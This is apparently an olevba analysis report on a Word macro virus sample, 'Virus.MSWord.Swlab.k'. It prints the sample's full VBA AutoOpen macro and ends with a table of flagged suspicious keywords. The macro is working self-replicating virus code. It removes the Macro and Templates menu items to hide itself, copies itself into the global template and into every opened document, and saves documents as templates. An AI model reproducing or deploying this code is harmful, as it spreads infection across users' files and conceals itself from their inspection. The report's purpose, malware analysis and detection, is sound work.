olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Swlab.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Swlab.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Swlab.k - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Bitch Concept Created by NEVERMORE

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

     If WordBasic.[MenuItemText$]("&Tools", 0, 13, 0) = "&Macro..." Then
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
     End If

Rem Virus Payload Area.

     WordBasic.AppHide "Program Manager"
     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
AutoOpenHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

Rem Virii Unite!eate Virus

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

